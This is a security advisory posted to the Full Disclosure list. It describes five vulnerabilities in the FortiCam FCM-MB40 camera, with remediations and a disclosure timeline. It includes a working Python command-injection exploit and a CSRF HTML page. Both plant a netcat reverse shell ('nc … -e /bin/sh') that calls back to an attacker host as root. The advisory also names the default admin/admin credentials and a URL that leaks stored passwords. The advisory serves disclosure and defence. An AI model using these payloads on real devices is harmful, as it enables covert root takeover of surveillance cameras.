@@ -1,0 +1,667 @@
+
+Date: Thu, 20 Jun 2019 07:39:35 +1000
+From: XORcat <xorcat@...eup.net>
+To: fulldisclosure@...lists.org
+Subject: [FD] Fortinet FortiCam FCM-MB40 Vulnerabilities
+
+Original posting: https://xor.cat/2019/06/19/fortinet-forticam-vulns/
+
+## Background
+
+In March of 2019 I discovered five vulnerabilities in Fortinet's
+FortiCam FCM-MB40[1] product.
+
+Part-way through disclosing this vulnerability, I discovered that the
+FCM-MB40 is manufactured by a company called Dynacolor Inc[2], which
+calls the product "Q2-H"[3].
+
+The FortiCam FCM-MB40 software version which I found these
+vulnerabilities in was the latest version at the time (and at the time
+of posting this, still is), v1.2.0.0.
+
+Since discovering these vulnerabilities I have been unable to get my
+hands on a Q2-H which is not branded as Fortinet. As such, I am unable
+to confirm whether the below vulnerabilities also apply directly to the
+Q2-H device. In saying that, I am reasonably confident that the majority
+of the vulnerabilities also affect the Q2-H.
+
+As of the date of publication (2019-06-19), no fix for these issues has
+been released or announced by Fortinet or Dynacolor.
+
+All five of these vulnerabilities are currently pending CVE assignment,
+and this page will be updated when they have been assigned.
+
+The first (1), CVE-TBA, is an unsanitised input vulnerability in the
+FortiCam's admin web interface, resulting in remote command execution as
+`root`, when authenticated as an administrative user.
+
+The second (2), CVE-TBA, is a cross-site request forgery (CSRF)
+vulnerability which allows an attacker to fool a browser logged in as
+the "admin" user into forging requests which can reconfigure the
+FortiCam in any way that the "admin" user is able to from the web
+interface.
+
+The third (3), CVE-TBA, is a hardcoded SSL/TLS encryption key
+vulnerability.
+
+The fourth (4), CVE-TBA, refers to the insecure (cleartext) storage of
+administrative password credentials on the device.
+
+The fifth (5), CVE-TBA, is a vulnerability whereby the device's
+"factory reset" function does not sufficiently reset the device.
+
+Below, I will cover all five vulnerabilities in detail.
+
+## 1 - CVE-TBA - FCM-MB40 Remote Command Execution as Root
+
+### Summary
+
+Forticam FCM-MB40 Remote Command Execution Vulnerability
+
+    Product: FCM-MB40
+    Version: v1.2.0.0
+    Vendor: Fortinet
+    CVE-ID: CVE-TBA
+    CWE-78: Improper Neutralisation of Special Elements used in an OS
+        Command ('OS Command Injection')
+
+Many CGI scripts in the FCM-MB40's `/cgi-bin/` web directory pass input
+from user-provided parameters directly to shell commands such as `sed`
+without sanitising or verifying the input.
+
+An attacker with admin access to the web interface is able to gain
+command execution as root, which would allow them to implement
+persistence, and have full covert control over the device for an
+indefinite period of time.
+
+### Details
+
+The below proof-of-concept python script exploits a call to `sed` in
+`/cgi-bin/camctrl_save_profile.cgi` which directly uses the parameter
+`name` from the user's GET request to modify the contents of
+`/cgi-bin/ddns.cgi` to execute a reverse shell using `netcat`.
+
+```python
+#!/usr/bin/python3
+
+import requests
+
+# replace IP addresses with relevant test environment IP addresses
+forticam_ip = '192.168.1.20'
+callback_ip = '192.168.1.10'
+callback_port = '1337'
+
+# default web interface admin password is admin
+username = 'admin'
+password = 'admin'
+
+name_param = 'a%20-e%20s/^if.*/nc\\t{}\\t{}\\t-e\\t\\/bin\\/sh\\nexit/%20../cgi-bin/ddns.cgi%20'.format(callback_ip, callback_port)
+sed_url = 'http://{}/cgi-bin/camctrl_save_profile.cgi?num=9&name={}&save=profile'.format(forticam_ip, name_param)
+
+execute_url = 'http://{}/cgi-bin/ddns.cgi'.format(forticam_ip)
+
+print("[-] Attacking {}".format(forticam_ip))
+
+requests.get(sed_url, auth=requests.auth.HTTPBasicAuth(username, password))
+requests.get(execute_url, auth=requests.auth.HTTPBasicAuth(username, password))
+```
+
+The line of code being exploited in `camctrl_save_profile.cgi` is line
+64, shown below (whitespace modified for ease of reading):
+
+```bash
+sed -i '/Profile.'$targetp'.Name=/s/Profile.'$targetp'.Name=.*/Profile.'$targetp'.Name='$name'/' /etc/sysconfig/$targetconf
+```
+
+Note the `$name` parameter is directly inserted into the `sed` command
+without sanitisation.
+
+This allows the attacker to take control of `sed` to modify the contents
+of any arbitrary file.
+
+Before running the above script, we run `nc -nvlp 1337` on our host, to
+catch the reverse shell that will be executed on the camera.
+
+In the above proof of concept we modify `ddns.cgi` to execute `nc
+192.168.1.10 1337 -e /bin/sh`.
+
+We then send a request to the camera, requesting `ddns.cgi`, causing our
+`nc` command to be executed as the `root` user.
+
+After the reverse shell connects back to us, we can verify that the
+exploit has successfully run as the root user:
+
+```
+id
+uid=0(root) gid=0(root)
+uname -a
+Linux FortiCamera 3.10.73 #5 PREEMPT Tue Jan 17 16:17:47 CST 2017 armv7l GNU/Linux
+```
+
+From this point, it is possible to take complete control of the camera
+in any way we like. 
+
+An attacker could utilise widely known default credentials and network
+reachability to covertly run commands as the root user, implanting a
+persistent callback to their command and control server which will
+remain on the camera until it's firmware is upgraded.
+
+#### Note
+
+ * The above pair of scripts are only an example of this vulnerability.
+   The same pattern which allows this exploit to function exists in many
+   other CGI scripts in the FCM-MB40's `/cgi-bin` web directory.
+
+### Recommended Remediations
+
+ * User input in all CGI scripts should be checked for potentially
+   dangerous characters before being inserted into shell commands.
+ * The web server executing CGI scripts should be running as a
+   non-privileged user, so that this vulnerability would not expose
+   access to the root user.
+
+### Fix Information
+
+Dynacolor and Fortinet have yet to provide a fix.
+
+---
+
+## 2 - CVE-TBA - FCM-MB40 CSRF in Multiple Scripts
+
+### Summary
+
+Forticam FCM-MB40 CSRF in Multiple CGI Scripts
+
+    Product: FCM-MB40
+    Version: v1.2.0.0
+    Vendor: Fortinet
+    CVE-ID: CVE-TBA
+    CWE-352: Cross-Site Request Forgery (CSRF)
+
+All CGI scripts in the FCM-MB40's `/cgi-bin/` web directory allow an
+attacker to fool a logged-in "admin"'s browser into forging requests
+which can reconfigure the FCM-MB40 in any way that the "admin" user is
+able to from the web interface.
+
+An attacker who knows the IP address of a FCM-MB40, and who is able to
+trick an "admin" user into opening a crafted webpage, is able to
+reconfigure the FCM-MB40 on behalf of the "admin" user, without their
+knowledge or authorisation.
+
+### Details
+
+The below are some (non-exhaustive) example changes that the attacker
+could make to the FCM-MB40 by exploiting this CSRF:
+
+ * Change admin password
+ * Add new admin account
+ * Restart camera
+ * Configure FTP server for camera to send footage to
+ * Disable scheduled recording
+ * Upgrade firmware
+ * Change camera hostname
+
+These changes are possible because the FCM-MB40's web interface uses GET
+parameters to influence the device's configuration state.
+
+For example, to change the device's hostname, a user simply needs to
+visit the following URL when logged in as the "admin" user:
+
+`http://192.168.1.20/cgi-bin/date.cgi?system_hostname=NewHostname`
+
+It is trivial for an attacker to trick a user's web browser into
+performing a GET request to a URL such as the above.
+
+Combined with the previously disclosed vulnerability (#1)
+regarding remote command execution, this CSRF vulnerability allows a
+remote, unauthenticated attacker to gain remote command execution as
+root. The below proof-of-concept web-page demonstrates this.
+
+```html
+<html>
+    <!-- FCM-MB40 CSRF to RCE as root, by Aaron Blair (@xorcat) -->
+    <head>
+        <script>
+const sleep = (milliseconds) => {
+    return new Promise(resolve => setTimeout(resolve, milliseconds))
+};
+var sed_url = 'http://192.168.1.20/cgi-bin/camctrl_save_profile.cgi?num=9&name=a%20-e%20s/^if.*/nc\\t192.168.1.10\\t1337\\t-e\\t\\/bin\\/sh\\nexit/%20../cgi-bin/ddns.cgi%20&save=profile';
+var execute_url = 'http://192.168.1.20/cgi-bin/ddns.cgi';
+
+var sed_img = document.createElement("img");
+sed_img.src = sed_url;
+
+sleep(400).then(() => {
+    var execute_img = document.createElement("img");
+    execute_img.src = execute_url;
+});
+        </script>
+    </head>
+    <body>
+        <h1>Welcome to my non-malicious website.</h1>
+    </body>
+</html>
+```
+
+Follow the following steps to demonstrate this PoC:
+
+ 1. Replace IP addresses in Javascript code to represent your testing
+    environment.
+ 2. Launch a `netcat` listener on the attacker's host using `nc -nvlp
+    1337`
+ 3. Ensure the "admin" user's browser is logged in to the FCM-MB40.
+    * Note: all modern browsers will cache Basic Authentication
+      credentials (such as those used by the FCM-MB40) even if the
+      FCM-MB40's administration page is closed.
+ 4. Open the above crafted HTML document using the "admin" user's
+    browser. 
+    * Note: In an attack scenario, this step would be performed by
+      implanting the code into a legitimate webpage that the "admin"
+      user visits, or by tricking the "admin" user into opening a page
+      which includes the code.
+ 5. Note that the `netcat` listener established in step 2. has received
+    a connection from the camera, and that it is presenting a `/bin/sh`
+    session as root.
+    * Note: type `id` in the `netcat` connection to verify this.
+
+_Note: After this issue has been exploited, the state of the system will
+have changed, and future exploitation attempts may require
+modification._
+
+### Recommended Remediations
+
+ * All web application parameters which are used to modify device state
+   should be required to be sent as POST parameters.
+ * POST requests should be protected by implementing some form of CSRF
+   protection, such as dynamic secret tokens which are sent to the user
+   as part of the HTML form which they fill out. This secret token is
+   then sent as a POST parameter with the form data. This secret token
+   must be verified by the CGI script as correct before any changes are
+   made to the device.
+ * More information about CSRF and how to prevent it can be found on the
+   OWASP website[4].
+
+### Fix Information
+
+Dynacolor and Fortinet have yet to provide a fix.
+
+---
+
+## 3 - CVE-TBA - FCM-MB40 Hardcoded SSL/TLS Encryption Keys
+
+### Summary
+
+Forticam FCM-MB40 Hardcoded SSL/TLS Encryption Keys
+
+    Product: FCM-MB40
+    Version: v1.2.0.0
+    Vendor: Fortinet
+    CVE-ID: CVE-TBA
+    CWE-321: Use of Hard-coded Cryptographic Key
+
+The FortiCam FCM-MB40 and other FortiCams utilise a hardcoded,
+preconfigured SSL certificate for their web administration interface.
+
+This could allow anybody with access to the traffic to decrypt after the
+fact, or man-in-the-middle the traffic if they are in-line.
+
+### Details
+
+The FortiCam FCM-MB40's Mbedthis Appweb web server uses an SSL
+certificate deployed with the firmware, and is never changed unless the
+user chooses to regenerate a new certificate.
+
+Effectively, all FortiCam FCM-MB40's use the same SSL certificate,
+meaning that any user with access to one of the cameras is able to
+decrypt the SSL traffic for any FCM-MB40.
+
+The below lines are extracted from `/etc/appWeb/appweb.conf`, which
+identify the certificate for the camera to use:
+
+```apache
+<VirtualHost *:443>                                                        
+                DocumentRoot "/usr/apache/htdocs"                         
+                SSLEngine on                                                                   
+                SSLCipherSuite ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP:+eNULL
+                SSLProtocol ALL -SSLV2                                           
+                                                                       
+                #                                                                     
+                #       WARNING: you must regenerate the server.crt and server.key.pem
+                #                                              
+                SSLCertificateFile "/etc/ssl/certificate.pem"                  
+                                                                              
+                #                                                                              
+                #       WARNING: we are using the decrypted key here so it won't prompt for the
+                #       password. Replace with server.key for higher security  
+                #                                                            
+                SSLCertificateKeyFile "/etc/ssl/certificate.pem"           
+```
+
+A description of the listed certificate (private key excluded) is
+included below:
+
+```
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number: 138467 (0x21ce3)
+        Signature Algorithm: sha1WithRSAEncryption
+        Issuer: C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=Certificate Authority, CN=support/emailAddress=support@...tinet.com
+        Validity
+            Not Before: Aug 14 15:18:49 2012 GMT
+            Not After : Jan 19 03:14:07 2038 GMT
+        Subject: C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=FortiCam, CN=camera/emailAddress=support@...tinet.com
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+            RSA Public Key: (2048 bit)
+                Modulus (2048 bit):
+                    00:c1:db:15:48:58:a9:af:04:13:18:8d:e6:14:53:
+                    69:48:4d:3e:b1:25:ef:2f:f9:b4:02:2d:31:6e:93:
+                    8a:6f:fb:49:1d:07:91:75:1a:6a:10:21:f5:00:a4:
+                    67:27:20:53:46:34:6b:0e:91:eb:5d:5d:72:39:78:
+                    3d:81:97:22:5c:48:d6:07:d5:ab:21:ee:24:59:08:
+                    28:65:1e:9f:6a:ab:73:c4:ca:1c:21:79:67:bf:15:
+                    d2:09:6a:1c:91:09:4b:73:5c:5e:d2:6d:e3:e4:e3:
+                    17:92:f5:48:ef:e7:b1:4a:45:d4:59:44:88:61:11:
+                    7c:81:64:82:ae:2f:41:75:91:e8:2e:83:83:22:a2:
+                    83:3a:3b:aa:44:92:47:6c:50:65:33:95:db:d4:57:
+                    54:ab:e6:78:3c:12:8b:cc:45:56:fb:ef:54:d1:47:
+                    c0:20:bb:55:78:22:e6:f7:3f:88:83:e9:48:98:0e:
+                    12:6c:6b:52:9b:4b:10:aa:78:93:1d:9c:4a:a1:61:
+                    8c:00:67:b1:79:66:ad:da:a7:37:90:87:00:8d:fa:
+                    11:6a:91:f0:85:be:98:a6:01:e2:1b:38:ac:83:b5:
+                    82:5c:28:cb:8c:d9:43:e1:6b:30:7c:84:cb:0a:14:
+                    fd:0f:cd:02:68:4f:c7:4a:e6:52:0a:77:0e:bb:84:
+                    5f:bd
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 Basic Constraints: 
+                CA:FALSE
+    Signature Algorithm: sha1WithRSAEncryption
+        d2:ef:47:0c:ba:dc:15:17:80:10:6a:49:88:b0:3d:48:82:cf:
+        fb:05:d7:7e:48:9b:c7:1f:83:fe:87:2f:b4:86:ca:bb:73:d0:
+        82:6d:7f:68:29:0e:54:00:c2:23:3d:8d:b3:d9:7d:69:1d:82:
+        21:31:a8:76:f0:f3:67:99:3a:26:78:8e:39:a6:37:ef:c1:9e:
+        dd:13:67:e2:08:04:d5:25:17:13:8f:84:59:c0:57:9c:b4:2b:
+        be:17:31:16:e4:d3:28:db:0e:c8:0a:20:75:49:08:3b:10:98:
+        28:27:cb:0f:67:5a:ad:bc:71:14:33:29:89:74:35:f1:53:4a:
+        be:0b:8b:d3:6e:0f:26:26:84:5d:dc:64:ce:0c:3a:fc:77:91:
+        ea:dd:d4:1b:af:e9:fc:f8:1c:a5:28:38:82:2e:d2:69:56:6c:
+        04:95:8a:34:10:8b:46:26:67:e8:2c:0f:e7:10:6d:11:1f:d2:
+        b5:9d:7c:22:ba:91:93:b6:23:97:8e:b0:a6:b8:b5:43:ee:64:
+        64:c1:f9:08:a7:de:e3:48:8e:a1:46:6a:b6:46:bd:8f:ab:06:
+        67:a9:d0:84:69:18:e9:a7:24:ca:54:b6:cf:67:58:c8:23:2e:
+        f4:7e:9b:89:d6:74:69:26:4a:5f:cc:74:6e:dc:34:3d:65:ef:
+        08:05:4f:43
+-----BEGIN CERTIFICATE-----
+MIIDuzCCAqOgAwIBAgIDAhzjMA0GCSqGSIb3DQEBBQUAMIGgMQswCQYDVQQGEwJV
+UzETMBEGA1UECBMKQ2FsaWZvcm5pYTESMBAGA1UEBxMJU3Vubnl2YWxlMREwDwYD
+VQQKEwhGb3J0aW5ldDEeMBwGA1UECxMVQ2VydGlmaWNhdGUgQXV0aG9yaXR5MRAw
+DgYDVQQDEwdzdXBwb3J0MSMwIQYJKoZIhvcNAQkBFhRzdXBwb3J0QGZvcnRpbmV0
+LmNvbTAeFw0xMjA4MTQxNTE4NDlaFw0zODAxMTkwMzE0MDdaMIGPMQswCQYDVQQG
+EwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTESMBAGA1UEBxMJU3Vubnl2YWxlMREw
+DwYDVQQKEwhGb3J0aW5ldDERMA8GA1UECxMIRm9ydGlDYW0xMTAvBgNVBAMUKGNh
+bWVyYS9lbWFpbEFkZHJlc3M9c3VwcG9ydEBmb3J0aW5ldC5jb20wggEiMA0GCSqG
+SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDB2xVIWKmvBBMYjeYUU2lITT6xJe8v+bQC
+LTFuk4pv+0kdB5F1GmoQIfUApGcnIFNGNGsOketdXXI5eD2BlyJcSNYH1ash7iRZ
+CChlHp9qq3PEyhwheWe/FdIJahyRCUtzXF7SbePk4xeS9Ujv57FKRdRZRIhhEXyB
+ZIKuL0F1kegug4MiooM6O6pEkkdsUGUzldvUV1Sr5ng8EovMRVb771TRR8Agu1V4
+Iub3P4iD6UiYDhJsa1KbSxCqeJMdnEqhYYwAZ7F5Zq3apzeQhwCN+hFqkfCFvpim
+AeIbOKyDtYJcKMuM2UPhazB8hMsKFP0PzQJoT8dK5lIKdw67hF+9AgMBAAGjDTAL
+MAkGA1UdEwQCMAAwDQYJKoZIhvcNAQEFBQADggEBANLvRwy63BUXgBBqSYiwPUiC
+z/sF135Im8cfg/6HL7SGyrtz0IJtf2gpDlQAwiM9jbPZfWkdgiExqHbw82eZOiZ4
+jjmmN+/Bnt0TZ+IIBNUlFxOPhFnAV5y0K74XMRbk0yjbDsgKIHVJCDsQmCgnyw9n
+Wq28cRQzKYl0NfFTSr4Li9NuDyYmhF3cZM4MOvx3kerd1Buv6fz4HKUoOIIu0mlW
+bASVijQQi0YmZ+gsD+cQbREf0rWdfCK6kZO2I5eOsKa4tUPuZGTB+Qin3uNIjqFG
+arZGvY+rBmep0IRpGOmnJMpUts9nWMgjLvR+m4nWdGkmSl/MdG7cND1l7wgFT0M=
+-----END CERTIFICATE-----
+```
+
+Using the above certificate, and the corresponding private key, anybody
+who gains access to the SSL traffic from an FCM-MB40 is able to decrypt
+it, which can expose the admin credentials, even if the camera is joined
+to and managed by FortiRecorder.
+
+### Recommended Remediations
+
+ * Upon first boot with a fresh firmware image, the camera should
+   generate a unique SSL certificate which is not shared between
+   customers and devices.
+
+### Fix Information
+
+Dynacolor and Fortinet have yet to provide a fix.
+
+---
+
+## 4 - CVE-TBA - FCM-MB40 Cleartext Storage of Credentials
+
+### Summary
+
+Forticam FCM-MB40 Cleartext Storage of Credentials
+
+    Product: FCM-MB40
+    Version: v1.2.0.0
+    Vendor: Fortinet
+    CVE-ID: CVE-TBA
+    CWE-256: Unprotected Storage of Credentials
+
+The FortiCam FCM-MB40 stores the username and password configured for
+the administrative web interface in cleartext on it's filesystem.
+
+### Details
+
+The login credentials for any user allowed to log into the web interface
+are accessible in the file `/etc/appWeb/appweb.pass`.
+
+These credentials are also accessible from the following URL on the
+camera's web administration interface:
+`/cgi-bin/getuserinfo.cgi?mode=info`.
+
+If a user gains read-only access to the device's filesystem, or web
+administration interface, they are able to acquire the credentials used
+to administer the device.
+
+Due to this issue, a user with filesystem access is also able to read
+the password which FortiRecorder sets on a FortiCam FCM-MB40.
+
+If FortiRecorder uses the same password for all FortiCams when they join
+the FortiRecorder, this issue would allow a user with access to one
+camera to gain access to every camera "owned" by the FortiRecorder.
+
+### Recommended Remediations
+
+ * User credentials should be stored in a strong hash format which is
+   suitable for password storage, instead of cleartext. `bcrypt` can be
+   configured as a suitably strong functionz
+
+### Fix Information
+
+Dynacolor and Fortinet have yet to provide a fix.
+
+---
+
+## 5 - CVE-TBA - FCM-MB40 Insufficient Factory Reset
+
+### Summary
+
+Forticam FCM-MB40 Insufficient Factory Reset Procedure
+
+    Product: FCM-MB40
+    Version: v1.2.0.0
+    Vendor: Fortinet
+    CVE-ID: CVE-TBA
+    CWE-665: Improper Initialisation
+
+The FortiCam FCM-MB40's factory reset functionality, initiated through
+pressing the physical factory reset button, or initiated through
+software, does not reset all aspects of the system to the factory state.
+
+An adversary with temporary access to the device could implant a
+backdoor account or service which would not be removed when undertaking
+a factory reset.
+
+### Details
+
+If low level access is gained to a FortiCam MB40, and filesystem
+modifications are made, these are not reverted when the device owner
+executes the factory reset function.
+
+The factory reset function is implemented in `/usr/sbin/default.sh` and
+`/usr/apache/htdocs/cgi-bin/admin/hardfactorydefault.cgi`.
+
+Both of these scripts reset some configuration parameters.
+
+Combined with the previously disclosed vulnerability (#1)
+regarding remote command execution, any user which is able to gain
+access to the camera is able to implant a backdoor executable on the
+camera which will execute whenever the camera starts, giving the
+attacker persistent root access to the camera. 
+
+For example: 
+
+ * a user could sell the camera on to a second owner;
+ * the camera could be tampered with in transit to its final
+   destination.
+
+After executing the factory reset function, a backdoor previously
+installed, such as a malicious cron entry or changed root password, is
+not removed. 
+
+The only way that a user which doesn't trust their supply chain is able
+to restore the device to factory defaults is to perform a firmware
+upgrade, however in order to perform a firmware upgrade the user must
+first connect the untrusted device to their network.
+
+### Recommended Remediations
+
+ * The factory reset function should re-flash the firmware on the
+   camera, and this process should be cryptographically verified to
+   ensure that the firmware which is being reflashed has not been
+   tampered with.
+
+### Fix Information
+
+Dynacolor and Fortinet have yet to provide a fix.
+
+## General Recommendations For Users
+
+If you are using the FortiCam FCM-MB40 devices, consider the below tips
+in order harden your device, and protect your network.
+
+ * Set a strong, **unique** password for the administrative user.
+    * Do not use a password which you use for other systems on this
+      device.
+ * Keep these devices in a segregated environment with firewall rules
+   preventing it from communicating with the Internet, or other networks
+   in your environment, and preventing other devices on your network
+   from communicating with it.
+ * Generate SSL/TLS certificates from your internal CA infrastructure,
+   or generate a new self-signed certificate on the device, replacing
+   the built-in, hardcoded certificate.
+ * Whenever attempting to perform a factory reset, realise that the
+   factory reset functionality does not reset the device to factory
+   defaults. In order to completely restore the device to defaults,
+   perform a firmware upgrade.
+
+## Timeline
+
+2019-03-08
+ * Reached out to Fortinet contacts asking who to contact for
+   disclosure.  Provided contact information and PGP information.
+
+2019-03-09
+ * Provided full vulnerability information to provided contact.
+ * Provided full vulnerability information about vulnerability two to
+   provided contact.
+ * Preferred date of disclosure, 2019-05-10, provided to contact.
+
+2019-03-18
+ * Reached out to contact asking whether they have received
+   communications. Realised that contact was not able to decrypt my
+   messages.
+ * Sent the same vulnerability information to psirt@...tinet.com
+   including revised disclosure date of 2019-05-17.
+
+2019-03-20
+ * Received response from Fortinet PSIRT, stating that the upstream
+   vendor has been notified, and that because the development is done by
+   a 3rd party, Fortinet is unsure whether a 60 day disclosure date will
+   be met.
+
+2019-03-21
+ * Provided full vulnerability information about vulnerabilities three,
+   four and five to Fortinet PSIRT. Noted that preferred disclosure date
+   for these vulnerabilities is 2019-05-20.
+ * Received acknowledgement from Fortinet PSIRT.
+
+2019-04-10
+ * Requested an update on progress.
+
+2019-04-12
+ * Fortinet PSIRT state that no update has been provided from upstream
+   vendor.
+
+2019-04-27
+ * Fortinet PSIRT provides email addresses for upstream vendor,
+   Dynacolor.
+ * Reached out to Dynacolor, asking for PGP/secure communications
+   method.
+
+2019-05-09
+ * Reminded Fortinet that vulnerabilities one and two are planned to be
+   disclosed on 2019-05-17.
+
+2019-05-13
+ * Fortinet PSIRT mention that Dynacolor have acknowledged the
+   vulnerabilities.
+
+2019-05-15
+ * Fortinet PSIRT state that they are not sure whether Dynacolor are
+   able to issues a patch before 2019-05-17. Fortinet suggest a 90-day
+   disclosure deadline in this case.
+
+2019-05-16
+ * Respond to PSIRT with updated disclosure dates 2019-06-16 and
+   2019-06-19, also letting them know that I have yet to receive a
+   response from Dynacolor.
+ * Reach out to Dynacolor again, stating that I have not yet received a
+   response, and that there are product vulnerabilities which will be
+   disclosed on 2019-06-16, following the disclosure period previously
+   discussed with Fortinet. I also repeat my request to set up an
+   encrypted channel.
+
+2019-05-17
+ * Dynacolor respond, stating that they do not have a PGP key, and ask
+   whether there is another way we could communicate.
+ * Respond stating I am happy to communicate using Keybase (account
+   provided), or any other secure method they can use. Alternatively I
+   state that we can communicate using plaintext email if required.
+
+2019-06-19
+ * This post is published.
+
+## Closure
+
+Thanks to Fortinet for their timely and friendly co-operation, and to my
+employer, RIoT Solutions[5], for allowing me to perform this research as
+part of my work.
+
+[1]: https://www.fortinet.com/content/dam/fortinet/assets/data-sheets/FortiCamera.pdf
+[2]: https://www.dynacolor.com.tw/
+[3]: https://www.dynacolor.com.tw/portfolio-item/h/
+[4]: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
+[5]: https://www.riotsolutions.com.au/
+
+-- 
+XORcat
+PGP Key: 0xA528A62C
+https://keybase.io/xorcat
+
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
+
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
